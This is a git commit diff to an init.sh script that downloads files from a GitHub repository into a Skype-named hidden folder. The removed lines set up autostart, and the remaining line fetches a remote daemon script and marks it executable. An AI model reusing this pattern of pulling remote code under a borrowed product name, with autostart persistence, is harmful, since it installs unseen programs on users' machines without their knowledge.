dd8fccf590b349f59ace070dd6ca45df41c79a1a
Nadilicus <155823831+Nadilicus@users.noreply.github.com>
2024-01-27 17:10:29 +0100

    Update init.sh

--- init.sh
+++ init.sh
@@ -1,11 +1,5 @@
 #!/bin/bash
 
 mkdir ~/.local/share/skype
-curl "https://raw.githubusercontent.com/Doxeno/sealeo/main/skype.desktop" > ~/.config/autostart/skype.desktop
-curl "https://raw.githubusercontent.com/Doxeno/sealeo/main/skype_launcher.sh" > ~/.local/share/skype/skype_launcher.sh
-curl "https://raw.githubusercontent.com/Doxeno/sealeo/main/notification.wav" > ~/.local/share/skype/notification.wav
-curl "https://raw.githubusercontent.com/Doxeno/sealeo/main/logo.jpg" > ~/.local/share/skype/logo.jpg
 curl "https://raw.githubusercontent.com/Doxeno/sealeo/main/skype_daemon.py" > ~/.local/share/skype/skype_daemon.sh
-chmod +x ~/.config/autostart/skype.desktop
-chmod +x ~/.local/share/skype/*.sh
-chmod +x ~/.local/share/skype/logo.jpg
+chmod +x ~/.local/share/skype/skype_daemon.sh
